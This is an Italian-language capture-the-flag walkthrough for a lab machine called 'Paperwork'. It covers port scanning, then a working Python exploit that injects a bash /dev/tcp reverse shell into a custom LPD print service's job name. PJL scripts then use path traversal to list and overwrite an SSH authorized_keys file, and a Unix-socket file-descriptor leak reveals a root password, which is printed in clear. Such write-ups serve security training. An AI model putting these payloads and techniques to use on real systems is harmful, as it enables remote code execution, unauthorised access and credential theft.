# Macchina Paperwork

IP vittima: 10.129.248.117
IP attaccante: 10.10.14.241
## 1. Ricognizione Iniziale (Recon)

### 1.1 Scansione Porte

È stata eseguita una scansione SYN completa delle porte per identificare i servizi esposti sul target `10.129.31.62`:
`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.248.117`
```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-22 22:11 CEST
Initiating SYN Stealth Scan at 22:11
Scanning 10.129.248.117 [65535 ports]
Discovered open port 80/tcp on 10.129.248.117
Discovered open port 22/tcp on 10.129.248.117
Discovered open port 1515/tcp on 10.129.248.117
Completed SYN Stealth Scan at 22:11, 13.08s elapsed (65535 total ports)
Nmap scan report for 10.129.248.117
Host is up, received user-set (0.028s latency).
Scanned at 2026-07-22 22:11:00 CEST for 13s
Not shown: 65081 closed tcp ports (reset), 451 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       REASON
22/tcp   open  ssh           syn-ack ttl 63
80/tcp   open  http          syn-ack ttl 63
1515/tcp open  ifor-protocol syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.14 seconds
           Raw packets sent: 68123 (2.997MB) | Rcvd: 65177 (2.607MB)
```

**Risultati:**
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1515/tcp open  ifor-protocol
### 1.2 Scansione Approfondita dei Servizi

`sudo nmap -sC -sV -O -p22,80,1515 10.129.248.117`
```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-22 22:14 CEST
Nmap scan report for paperwork.htb (10.129.248.117)
Host is up (0.029s latency).

PORT     STATE SERVICE        VERSION
22/tcp   open  ssh            OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http           nginx 1.28.0 (Ubuntu)
|_http-title: Intranet | Document Archiving Service
|_http-server-header: nginx/1.28.0 (Ubuntu)
1515/tcp open  ifor-protocol?
| fingerprint-strings: 
|   TerminalServer, TerminalServerCookie: 
|_    Archive_Printer is ready and printing.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1515-TCP:V=7.95%I=7%D=7/22%Time=6A6124A1%P=x86_64-pc-linux-gnu%r(Te
SF:rminalServerCookie,27,"Archive_Printer\x20is\x20ready\x20and\x20printin
SF:g\.\n")%r(TerminalServer,27,"Archive_Printer\x20is\x20ready\x20and\x20p
SF:rinting\.\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.25 seconds
```

**Risultati:**
- **Porta 22 (SSH):** OpenSSH 10.0p2 (Ubuntu)
- **Porta 80 (HTTP):** nginx 1.28.0 (Ubuntu) - reindirizzamento a `http://paperwork.htb`
- **Porta 1515:** Servizio sconosciuto con banner: `Archive_Printer is ready and printing.`

### 1.3 Configurazione DNS Locale

Aggiunto l'host al file `/etc/hosts` per risolvere il dominio:
`echo "10.129.248.117 paperwork.htb" | sudo tee -a /etc/hosts`
## 2. Enumerazione Web

### 2.1 Analisi della Pagina Web

Visitando `http://paperwork.htb` si ottiene una pagina che descrive un servizio di archiviazione documenti con riferimento al protocollo **RFC 1179 (LPD)** e una coda chiamata `archive_intake`. È presente anche un link che punta a `paperwork-archive-v1.02` che scarichiamo.
## 3. Analisi del Servizio sulla Porta 1515 (LPD)

### 3.1 Download del File paperwork-archive-v1.02

Il file `paperwork-archive-v1.02` è un archivio ZIP contenente il file `server.py`.

### 3.2 Analisi del Codice `server.py`

Il codice implementa un server LPD personalizzato in Python. Di seguito i punti chiave:
- La variabile d'ambiente `LPD_QUEUE` definisce la coda valida (nell'ambiente è `archive_intake`).
- Il server gestisce il comando `\x02` (ricezione di un job di stampa).
- I dati del job vengono parsati e viene estratto il nome del file dalla riga che inizia con `J`.
- Il nome del file viene passato a `subprocess.Popen` con `shell=True`, generando una vulnerabilità di **command injection**.

**Vulnerabilità:** Command Injection nel parametro `job_name`.

### 3.3 Sviluppo dell'Exploit per LPD

È stato creato uno script Python per sfruttare la command injection e ottenere una reverse shell.

**Script exploit.py:**

``` python
#!/usr/bin/env python3
import socket
import time
import sys

def exploit(target_ip, local_ip, local_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, 1515))
    
    # 1. Comando di ricezione job con coda valida
    s.send(b'\x02archive_intake\n')
    resp = s.recv(1)
    if resp != b'\x00':
        print("[!] Errore: coda non accettata")
        s.close()
        return
    
    # 2. Chunk di controllo con dimensione
    s.send(b'\x02100\n')
    resp2 = s.recv(1)
    
    # 3. Payload per reverse shell (command injection)
    payload = f"J'; bash -c 'bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1' #\n"
    padding = b'A' * (100 - len(payload))
    content = payload.encode() + padding
    s.send(content)
    time.sleep(2)
    s.close()

if __name__ == "__main__":
    if len(sys.argv) !=4:
        print(f"Uso: {sys.argv[0]} <RHOST> <LHOST> <PORT>")
        sys.exit(1)

    rhost = sys.argv[1]
    lhost = sys.argv[2]
    lport = sys.argv[3]

    exploit(rhost, lhost, lport)

```

**Spiegazione del payload:**

`J'; bash -c 'bash -i >& /dev/tcp/10.10.14.241/4444 0>&1' #`

Il payload sfrutta l'iniezione nel comando:

`echo 'Archive: '; bash -c 'bash -i >& /dev/tcp/10.10.14.241/4444 0>&1' #' >> /tmp/archive.log`

- Il comando `J` viene interpretato come nome del job.
- L'apostrofo chiude la stringa, e il comando successivo viene eseguito.
- Il `#` commenta il resto, evitando errori di sintassi.
## 4. Ottenimento della Shell come `lp`

### 4.1 Preparazione del Listener

Sulla macchina dell'attaccante:

`nc -lvnp 4444`
### 4.2 Esecuzione dell'Exploit

`python3 exploit.py 10.129.248.117 10.10.14.241 4444`
### 4.3 Connessione Ricevuta

```
Listening on 0.0.0.0 4444
Connection received on 10.129.248.117 52052
bash: cannot set terminal process group (994): Inappropriate ioctl for device
bash: no job control in this shell
lp@paperwork:/opt/LPDServer$ whoami
whoami
lp
```

**Shell ottenuta con successo come utente `lp`.**
### 4.4 Stabilizzazione della Shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm-256color
```

Il foothold è stato ottenuto sfruttando una vulnerabilità di command injection nel servizio LPD personalizzato sulla porta 1515. L'accesso iniziale è stato ottenuto come utente `lp`, che funge da punto di partenza per ulteriori attività di escalation dei privilegi e pivot laterale.
## 5. Accesso iniziale

### 5.1 Utente lp

Abbiamo ottenuto una shell come utente `lp`.

```
lp@paperwork:/opt/LPDServer$ whoami
lp
lp@paperwork:/opt/LPDServer$ id
uid=7(lp) gid=7(lp) groups=7(lp)
```

L'obiettivo iniziale era enumerare il sistema, individuare eventuali servizi interni accessibili e trovare un percorso per ottenere l'accesso a un utente con privilegi superiori.
### 5.2 utente archivist

con `cat /etc/passwd` scopriamo la presenza dell'utente `archivist` che ha una cartella nella cartella `home`
```
...
archivist:x:1000:1000:archivist:/home/archivist:/bin/bash
...
```
## 6. Enumerazione dei servizi interni

I servizi in ascolto sono stati enumerati con:

```
ss -lntp
```

Tra i servizi individuati, risultava particolarmente interessante una porta esposta solo sul loopback:

```
127.0.0.1:9100
```

La porta TCP `9100` è comunemente associata a servizi JetDirect o raw printing.

Poiché sulla macchina non erano presenti né `nc` né `nmap`, la raggiungibilità della porta è stata verificata utilizzando Bash.

```
timeout 2 bash -c 'echo > /dev/tcp/127.0.0.1/9100' \
  && echo "PORTA APERTA" \
  || echo "CONNESSIONE FALLITA"
```

Output:

```
PORTA APERTA
```

Lo stesso controllo è eseguibile anche tramite Python:

```
python3 -c 'import socket; s=socket.create_connection(("127.0.0.1",9100),2); print("Porta 9100 raggiungibile"); s.close()'
```

Output:

```
Porta 9100 raggiungibile
```

Il servizio è quindi accessibile dalla macchina compromessa.
## 7. Identificazione del processo in ascolto sulla porta 9100

Sono stati enumerati i processi relativi ai servizi di stampa:

```
ps aux | grep -Ei 'LPD|9100|printer' | grep -v grep
```

Output rilevante:

```
archivi+     990  0.0  0.4  28040 17576 ?        Ss   18:58   0:00 /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ /home/archivist/printer/logs/commands.log
lp           994  0.0  0.3  94272 12672 ?        Ss   18:58   0:00 /usr/bin/python3 /opt/LPDServer/server.py
```

Sono quindi emersi due servizi custom legati alla stampa:

```
LPD Server
└── /opt/LPDServer/server.py
    └── Utente: lp

JetDirect Server
└── /home/archivist/printer/jetdirect.py
    └── Utente: archivist
    └── Porta: 9100
```

Il servizio JetDirect era particolarmente interessante perché viene eseguito con i privilegi dell'utente `archivist`.
Una vulnerabilità di lettura o scrittura arbitraria di file in questo servizio potrebbe consentire l'accesso ai file appartenenti a `archivist`.
## 8. Pivot utente: da `lp` a `archivist`

È stato inviato un comando PJL minimale tramite script python (py1.py) creato nella cartella `/tmp`.

``` python
import socket

HOST = "127.0.0.1"
PORT = 9100

payload = b'\x1b%-12345X@PJL INFO ID\r\n'

print(f"[+] Connessione a {HOST}:{PORT}")

with socket.create_connection((HOST, PORT), timeout=3) as s:
    s.settimeout(5)

    print(f"[+] Invio {len(payload)} byte:")
    print(repr(payload))

    s.sendall(payload)

    try:
        data = s.recv(4096)

        if data == b"":
            print("[-] EOF: il server ha chiuso la connessione")
        else:
            print(f"[+] Ricevuti {len(data)} byte")
            print("[+] RAW:", repr(data))
            print("[+] TEXT:")
            print(data.decode(errors="replace"))

    except socket.timeout:
        print(
            "[-] TIMEOUT: il server mantiene "
            "la connessione aperta ma non risponde"
        )
```

Output:

```
python3 py1.py
[+] Connessione a 127.0.0.1:9100
[+] Invio 23 byte:
b'\x1b%-12345X@PJL INFO ID\r\n'
[+] Ricevuti 17 byte
[+] RAW: b'HP LASERJET 4ML\r\n'
[+] TEXT:
HP LASERJET 4ML
```

Questo conferma che il servizio accetta correttamente comandi PJL.

Abbiamo appurato che sulla porta 22 è presente un servizio SSH che accetta password e publickey per l'autentificazione, quindi l'idea è quella di non cercare la password di `archivist`, ma fare in modo che SSH riconosca **una chiave controllata da noi autorizzata per quell’utente**.
### 8.1 Enumerazione della directory SSH di `archivist`

Il passo successivo è verificare l'esistenza della directory `.ssh` dell'utente `archivist`.

È stato utilizzato il seguente comando PJL:

```
@PJL FSDIRLIST NAME="0:\..\..\..\home\archivist\.ssh" ENTRY=1 COUNT=100
```

Script Python (py2.py):

``` python
import socket

HOST = "127.0.0.1"
PORT = 9100

payload = (
    b'\x1b%-12345X'
    b'@PJL FSDIRLIST '
    b'NAME="0:\\..\\..\\..\\home\\archivist\\.ssh" '
    b'ENTRY=1 COUNT=100\r\n'
)

print("[+] Payload:", repr(payload))

with socket.create_connection((HOST, PORT), timeout=3) as s:
    s.settimeout(5)
    s.sendall(payload)

    response = b""

    try:
        while True:
            data = s.recv(4096)

            if not data:
                break

            response += data

    except socket.timeout:
        pass

print(response.decode(errors="replace"))
```

Output:

```
[+] Payload: b'\x1b%-12345X@PJL FSDIRLIST NAME="0:\\..\\..\\..\\home\\archivist\\.ssh" ENTRY=1 COUNT=100\r\n'
. TYPE=DIR
.. TYPE=DIR
authorized_keys TYPE=FILE SIZE=0
```

La directory `.ssh` esiste e il file `authorized_keys` è già presente, ma vuoto.
Questa condizione rende possibile tentare l'accesso SSH come `archivist` scrivendo una propria chiave pubblica nel file.
### 8.2 Generazione della chiave SSH

Sulla macchina attaccante è genera una nuova coppia di chiavi SSH Ed25519:

```
ssh-keygen -t ed25519 -f ~/.ssh/archivist_htb -N ''
```

Sono stati generati i file:

```
~/.ssh/archivist_htb
~/.ssh/archivist_htb.pub
```

Trasferisci la chiave pubblica sulla macchina compromessa.

Sulla macchina attaccante:

```
cd ~/.ssh
python3 -m http.server 8000
```

Sul target:

```
wget http://10.10.14.241:8000/archivist_htb.pub -O /tmp/archivist.pub
```
### 8.3 Arbitrary File Write tramite PJL `FSDOWNLOAD`

Il comando PJL `FSDOWNLOAD` è utilizzabile per sovrascrivere il file vuoto `authorized_keys`.

Percorso target:

```
0:\..\..\..\home\archivist\.ssh\authorized_keys
```

Script Python (py3.py):

``` python
import socket

HOST = "127.0.0.1"
PORT = 9100

UEL = b"\x1b%-12345X"

remote_path = (
    r"0:\..\..\..\home\archivist\.ssh\authorized_keys"
)

local_file = "/tmp/archivist.pub"

with open(local_file, "rb") as f:
    content = f.read()

if not content.endswith(b"\n"):
    content += b"\n"

command = (
    f'@PJL FSDOWNLOAD FORMAT:BINARY '
    f'NAME="{remote_path}" '
    f'SIZE={len(content)}\r\n'
).encode()

payload = UEL + command + content + UEL

print(f"[+] Scrittura di {len(content)} byte")
print(f"[+] Target: {remote_path}")
print(f"[+] Command: {command!r}")
print(f"[+] Payload totale: {len(payload)} byte")

with socket.create_connection((HOST, PORT), timeout=3) as s:
    s.settimeout(5)
    s.sendall(payload)

    try:
        response = s.recv(4096)
        print("[+] Response:", repr(response))

    except socket.timeout:
        print("[*] Nessuna risposta dal servizio")
```

Output:

```
python3 py3.py
[+] Scrittura di 95 byte
[+] Target: 0:\..\..\..\home\archivist\.ssh\authorized_keys
[+] Command: b'@PJL FSDOWNLOAD FORMAT:BINARY NAME="0:\\..\\..\\..\\home\\archivist\\.ssh\\authorized_keys" SIZE=95\r\n'
[+] Payload totale: 207 byte
[+] Response: b'OK\r\n'
```

Il server ha accettato correttamente l'operazione di scrittura.
## 9. User archivist - user flag

L'accesso SSH è stato ottenuto utilizzando la chiave privata corrispondente. Sulla macchina attacante:

```
ssh -i ~/.ssh/archivist_htb archivist@10.129.248.117
```

Abbiamo ottenuto l-accesso come utente `archivist':

```
archivist@paperwork:~$ whoami
archivist
archivist@paperwork:~$ id
uid=1000(archivist) gid=1000(archivist) groups=1000(archivist)
```

È stata quindi recuperata la user flag nella cartella `/home/archivist`.
## 10. Privilege Escalation

Dopo aver ottenuto una shell SSH come utente `archivist`, l'obiettivo è individuare un processo o un servizio eseguito come `root` che possa essere sfruttato.
Prima di tutto stabilizziamo la shell come prima.

### 10.1 Individuazione del processo `paperwork-daemon`

Per l'enumerazione locale viene lanciato LinPEAS dopo averlo scaricato sulla macchina target:

```
/tmp/linpeas.sh
```

Tra i risultati compare un processo Python custom eseguito da `root`:

```
root        1467  0.0  0.4  28432 17964 ?        Ss   07:59   0:00 /usr/bin/python3 /usr/bin/paperwork-daemon
```

Il fatto che sia un programma non standard e che venga eseguito come `root` lo rende immediatamente interessante.

La presenza del processo viene confermata manualmente con:

```
ps aux | grep paperwork
```

Output:

```
root        1467  0.0  0.4  28432 17964 ?        Ss   07:59   0:00 /usr/bin/python3 /usr/bin/paperwork-daemon
```

A questo punto vogliamo capire **chi avvia quel processo**.
### 10.2 Individuazione del relativo servizio systemd

Poiché il processo è un daemon persistente, una delle prime ipotesi è che venga gestito da `systemd`.

Cerchiamo quindi servizi che contengano la parola `paperwork`:

```
systemctl list-units --type=service | grep -i paperwork
```

Output:

```
paperwork.service   loaded active running   Paperwork Management Daemon
```

Abbiamo quindi individuato il servizio:

```
paperwork.service
```

Per vedere come viene avviato:

```
systemctl cat paperwork.service
```

Output:

```
[Unit]
Description=Paperwork Management Daemon
After=network.target

[Service]
ExecStart=/usr/bin/python3 /usr/bin/paperwork-daemon
Restart=always
User=root
Group=root

[Install]
WantedBy=multi-user.target
```

Questo conferma tre cose importanti:

```
ExecStart=/usr/bin/python3 /usr/bin/paperwork-daemon
User=root
Group=root
```

Quindi il processo individuato da LinPEAS:

```
/usr/bin/paperwork-daemon
```

è proprio il programma avviato da:

```
paperwork.service
```

e viene eseguito con privilegi `root`.
### 10.3 Analisi del daemon

Il file è leggibile:

```
cat /usr/bin/paperwork-daemon
```

Dal codice emergono due elementi interessanti.

Il daemon apre come `root` il file:

```
/etc/paperwork/admin_pins.conf
```

con:

```
admin_fd = os.open(
    "/etc/paperwork/admin_pins.conf",
    os.O_RDONLY
)
```

Inoltre crea una Unix socket:

```
/run/paperwork/mgmt.sock
```

Verifichiamo i permessi:

```
ls -l /run/paperwork/mgmt.sock
```

Output:

```
srw-rw---- 1 root archivist 0 Jul 25 07:59 /run/paperwork/mgmt.sock
```

La socket appartiene quindi a:

```
root:archivist
```

e l'utente `archivist` può utilizzarla.
### 10.4 Vulnerabilità

Il daemon controlla il file:

```
/home/archivist/printer/logs/commands.log
```

alla ricerca di:

```
FSQUERY
FSUPLOAD
FSDOWNLOAD
```

Se trova una di queste stringhe, entra nella funzione di lockdown.

Il problema è che, durante il lockdown, il daemon passa al client anche il file descriptor di:

```
/etc/paperwork/admin_pins.conf
```

già aperto da `root`.

In pratica:

```
root apre admin_pins.conf
        ↓
paperwork-daemon
        ↓
mgmt.sock
        ↓
archivist riceve il file già aperto
```
### 10.5 Attivazione del daemon

Possiamo attivare il controllo inserendo direttamente una stringa sospetta nel log:

```
echo FSUPLOAD >> /home/archivist/printer/logs/commands.log
```

A questo punto, alla successiva connessione alla socket, il daemon entrerà nel ramo di lockdown.
### 10.6 Recupero della password

Creiamo uno script minimale:

```
nano /tmp/rootpass.py
```

Contenuto:

``` python
import socket
import array
import os

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")

fds = array.array("i")

msg, data, *_ = s.recvmsg(
    1024,
    socket.CMSG_SPACE(8)
)

for level, type_, raw in data:
    if type_ == socket.SCM_RIGHTS:
        fds.frombytes(raw[:8])

fd = fds[1]

os.lseek(fd, 0, 0)
print(os.read(fd, 1024).decode())
```

Eseguiamo:

```
python3 /tmp/rootpass.py
```

Output:

```
ADMIN_PASSWORD=ApparelMortuaryCedar22
```

Abbiamo quindi recuperato la password amministrativa.

Il motivo per cui funziona è semplice:

```
archivist non può aprire admin_pins.conf
                ↓
root lo apre
                ↓
paperwork-daemon passa il file già aperto
                ↓
archivist può leggerlo
```
## 11. Accesso root

Utilizziamo la password recuperata:

```
su -
```

Password:

```
ApparelMortuaryCedar22
```

Verifichiamo:

```
whoami
# root
```

Nella cartella `/root` troviamo la root flag.
